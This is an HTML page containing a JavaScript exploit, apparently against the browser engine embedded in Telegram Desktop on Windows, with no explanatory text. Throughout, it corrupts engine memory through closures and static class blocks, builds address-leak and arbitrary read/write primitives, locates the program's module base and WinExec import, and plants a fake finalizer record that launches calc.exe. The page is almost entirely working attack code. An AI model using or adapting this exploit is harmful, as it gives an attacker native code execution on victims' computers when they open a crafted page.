<!doctype html>
<html><body><div id="out"></div><script>
const slotReaders = [];
const slotWriters = [];
 
class WidgetResource {
  [Symbol.dispose]() {}
}
 
const widgetResource = new WidgetResource();
 
const bitsBuffer = new ArrayBuffer(8);
const bitsU32 = new Uint32Array(bitsBuffer);
const bitsF64 = new Float64Array(bitsBuffer);
 
function u64ToFloat(value) {
  bitsU32[0] = Number(value & 0xffffffffn);
  bitsU32[1] = Number((value >> 32n) & 0xffffffffn);
  return bitsF64[0];
}
 
function stringFromU64(value) {
  const bytes = [];
  for (let byte = 0; byte < 8; ++byte) {
    bytes.push(Number((value >> BigInt(byte * 8)) & 0xffn));
  }
  return String.fromCharCode(...bytes);
}
 
function u64FromString(value) {
  let accumulator = 0n;
  for (let byte = 0; byte < 8; ++byte) {
    accumulator |= BigInt(value.charCodeAt(byte)) << BigInt(byte * 8);
  }
  return accumulator;
}
 
class ThemeState {
  static {
    let x00 = 0, x01 = 1, x02 = 2, x03 = 3;
    let x04 = 4, x05 = 5, x06 = 6, x07 = 7;
    let x08 = 8, x09 = 9, x10 = 10, x11 = 11;
    let x12 = 12, x13 = 13, x14 = 14, x15 = 15;
    let x16 = 16, x17 = 17, x18 = 18, x19 = 19;
    let x20 = 20, x21 = 21, x22 = 22, x23 = 23;
    let x24 = 24, x25 = 25, x26 = 26, x27 = 27;
    let x28 = 28, x29 = 29, x30 = 30, x31 = 31;
 
    slotReaders[0] = () => x00; slotWriters[0] = value => x00 = value;
    slotReaders[1] = () => x01; slotWriters[1] = value => x01 = value;
    slotReaders[2] = () => x02; slotWriters[2] = value => x02 = value;
    slotReaders[3] = () => x03; slotWriters[3] = value => x03 = value;
    slotReaders[4] = () => x04; slotWriters[4] = value => x04 = value;
    slotReaders[5] = () => x05; slotWriters[5] = value => x05 = value;
    slotReaders[6] = () => x06; slotWriters[6] = value => x06 = value;
    slotReaders[7] = () => x07; slotWriters[7] = value => x07 = value;
    slotReaders[8] = () => x08; slotWriters[8] = value => x08 = value;
    slotReaders[9] = () => x09; slotWriters[9] = value => x09 = value;
    slotReaders[10] = () => x10; slotWriters[10] = value => x10 = value;
    slotReaders[11] = () => x11; slotWriters[11] = value => x11 = value;
    slotReaders[12] = () => x12; slotWriters[12] = value => x12 = value;
    slotReaders[13] = () => x13; slotWriters[13] = value => x13 = value;
    slotReaders[14] = () => x14; slotWriters[14] = value => x14 = value;
    slotReaders[15] = () => x15; slotWriters[15] = value => x15 = value;
    slotReaders[16] = () => x16; slotWriters[16] = value => x16 = value;
    slotReaders[17] = () => x17; slotWriters[17] = value => x17 = value;
    slotReaders[18] = () => x18; slotWriters[18] = value => x18 = value;
    slotReaders[19] = () => x19; slotWriters[19] = value => x19 = value;
    slotReaders[20] = () => x20; slotWriters[20] = value => x20 = value;
    slotReaders[21] = () => x21; slotWriters[21] = value => x21 = value;
    slotReaders[22] = () => x22; slotWriters[22] = value => x22 = value;
    slotReaders[23] = () => x23; slotWriters[23] = value => x23 = value;
    slotReaders[24] = () => x24; slotWriters[24] = value => x24 = value;
    slotReaders[25] = () => x25; slotWriters[25] = value => x25 = value;
    slotReaders[26] = () => x26; slotWriters[26] = value => x26 = value;
    slotReaders[27] = () => x27; slotWriters[27] = value => x27 = value;
    slotReaders[28] = () => x28; slotWriters[28] = value => x28 = value;
    slotReaders[29] = () => x29; slotWriters[29] = value => x29 = value;
    slotReaders[30] = () => x30; slotWriters[30] = value => x30 = value;
    slotReaders[31] = () => x31; slotWriters[31] = value => x31 = value;
 
    for (await using ignored of [widgetResource]) {}
  }
}
 
function frameProbe(writer, fake, dormant) {
  let v00 = 0, v01 = 1, v02 = 2, v03 = 3;
  let v04 = 4, v05 = 5, v06 = 6, v07 = 7;
  let v08 = 8, v09 = 9, v10 = 10, v11 = 11;
  let v12 = 12, v13 = 13, v14 = 14, v15 = 15;
  let v16 = 16, v17 = 17, v18 = 18, v19 = 19;
  let v20 = 20, v21 = 21, v22 = 22, v23 = 23;
  let v24 = 24, v25 = 25, v26 = 26, v27 = 27;
  let v28 = 28, v29 = 29, v30 = 30, v31 = 31;
  let v32 = 32, v33 = 33, v34 = 34, v35 = 35;
  let v36 = 36, v37 = 37, v38 = 38, v39 = 39;
  let v40 = 40, v41 = 41, v42 = 42, v43 = 43;
  let v44 = 44, v45 = 45, v46 = 46, v47 = 47;
  let v48 = 48, v49 = 49, v50 = 50, v51 = 51;
  let v52 = 52, v53 = 53, v54 = 54, v55 = 55;
  let v56 = 56, v57 = 57, v58 = 58, v59 = 59;
  let v60 = 60, v61 = 61, v62 = 62, v63 = 63;
 
  if (dormant) {
    return () => [
      v00, v01, v02, v03, v04, v05, v06, v07,
      v08, v09, v10, v11, v12, v13, v14, v15,
      v16, v17, v18, v19, v20, v21, v22, v23,
      v24, v25, v26, v27, v28, v29, v30, v31,
      v32, v33, v34, v35, v36, v37, v38, v39,
      v40, v41, v42, v43, v44, v45, v46, v47,
      v48, v49, v50, v51, v52, v53, v54, v55,
      v56, v57, v58, v59, v60, v61, v62, v63,
    ];
  }
 
  writer(fake);
  const get = () => v00;
  const set = value => v00 = value;
  writer(0);
  return [get, set];
}
 
function runFrameProbe(writer, fake) {
  return frameProbe(writer, fake, false);
}
 
const carrier = "A".repeat(4096);
const carrierSlice = carrier.slice(1, 4095);
const pointerCarrier = "B".repeat(4096);
const pointerCarrierSlice = pointerCarrier.slice(1, 4095);
const ropeSeed = "R".repeat(9000) + pointerCarrierSlice;
const retained = [];
for (let slotIndex = 0; slotIndex < slotWriters.length; ++slotIndex) {
  try {
    const handle = runFrameProbe(slotWriters[slotIndex], carrierSlice);
    retained.push(handle);
    handle[1](4096);
    handle[0]();
    handle[1](0x100000);
    if (carrier.length !== 0x100000) continue;
 
    const ropePair = runFrameProbe(slotWriters[slotIndex], ropeSeed);
    retained.push(ropePair);
    ropePair[1](64);
    let carrierAddress = 0n;
    for (let byte = 0; byte < 8; ++byte) {
      carrierAddress |= BigInt(pointerCarrierSlice.charCodeAt(byte)) << BigInt(byte * 8);
    }
 
    const targetData = carrierAddress + 24n;
    const addressBytes = [];
    for (let byte = 0; byte < 8; ++byte) {
      addressBytes.push(Number((targetData >> BigInt(byte * 8)) & 0xffn));
    }
    const targetString = String.fromCharCode(...addressBytes);
    const rwHandle = runFrameProbe(slotWriters[slotIndex], targetString);
    retained.push(rwHandle, targetString);
    rwHandle[1](0x12345678);
    const readBack = rwHandle[0]();
 
    function leakValue(value) {
      rwHandle[1](value);
      const address = u64FromString(pointerCarrier);
      rwHandle[1](0);
      return address;
    }
 
    const byteView = new Uint8Array(8);
    const byteViewObject = leakValue(byteView);
    const viewControlData = stringFromU64(byteViewObject + 56n);
    const viewControl = runFrameProbe(slotWriters[slotIndex], viewControlData);
    retained.push(byteView, viewControlData, viewControl);
 
    function retarget(address) {
      viewControl[1](u64ToFloat(address));
    }
 
    function readU32(address) {
      retarget(address);
      return (byteView[0] | (byteView[1] << 8) |
        (byteView[2] << 16) | (byteView[3] << 24)) >>> 0;
    }
 
    function readU64(address) {
      retarget(address);
      let value = 0n;
      for (let byte = 0; byte < 8; ++byte) {
        value |= BigInt(byteView[byte]) << BigInt(byte * 8);
      }
      return value;
    }
 
    retarget(targetData);
    const markerBytes = [0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11];
    for (let byte = 0; byte < 8; ++byte) byteView[byte] = markerBytes[byte];
    const writeBack = readU64(targetData);
 
    const nativeString = leakValue(String.fromCharCode);
    const nativeAddress = readU64(nativeString + 56n);
    let moduleBase = nativeAddress & ~0xffffn;
    let foundModule = false;
    for (let page = 0; page < 4096; ++page, moduleBase -= 0x10000n) {
      if ((readU32(moduleBase) & 0xffff) !== 0x5a4d) continue;
      const peOffset = BigInt(readU32(moduleBase + 0x3cn));
      if (peOffset < 0x1000n && readU32(moduleBase + peOffset) === 0x4550) {
        foundModule = true;
        break;
      }
    }
    if (!foundModule) throw new Error("module base not found");
 
    const ntOffset = BigInt(readU32(moduleBase + 0x3cn));
    const imageSize = readU32(moduleBase + ntOffset + 0x50n);
    const winExecCall = readU32(moduleBase + 0x29a72b5n);
    if (imageSize !== 0x0fb05000 || (winExecCall & 0xffff) !== 0x15ff)
      throw new Error("unexpected Telegram Desktop image");
 
    function writeBytes(address, bytes) {
      retarget(address);
      for (let byte = 0; byte < bytes.length; ++byte) {
        byteView[byte] = bytes[byte];
      }
    }
 
    function writeU64(address, value) {
      const bytes = [];
      for (let byte = 0; byte < 8; ++byte) {
        bytes.push(Number((value >> BigInt(byte * 8)) & 0xffn));
      }
      writeBytes(address, bytes);
    }
 
    const command = String.fromCharCode(99, 97, 108, 99, 46, 101, 120, 101, 0);
    const commandString = leakValue(command);
    const commandData = commandString + 24n;
 
    const recordSeed = [0, 0, 0, 0];
    retained.push(command, recordSeed);
    const donorAddress = leakValue(recordSeed);
    const recordData = readU64(donorAddress + 56n);
    writeU64(donorAddress + 56n, 0n);
    writeU64(donorAddress + 64n, 0n);
 
    const winExecSlot = readU64(moduleBase + 0x715c108n);
    if (winExecSlot < 0x10000n) throw new Error("WinExec import not resolved");
    writeU64(recordData + 0n, 0n);
    writeU64(recordData + 8n, 0n);
    writeU64(recordData + 16n, commandData);
    writeU64(recordData + 24n, winExecSlot);
 
    let finalizerCarrier = Object.create(null);
    const carrierData = leakValue(finalizerCarrier);
    writeBytes(carrierData + 18n, [16, 0]);
    writeU64(carrierData + 48n, recordData);
 
    finalizerCarrier = null;
 
    break;
  } catch (error) {}
}
 
</script></body></html>
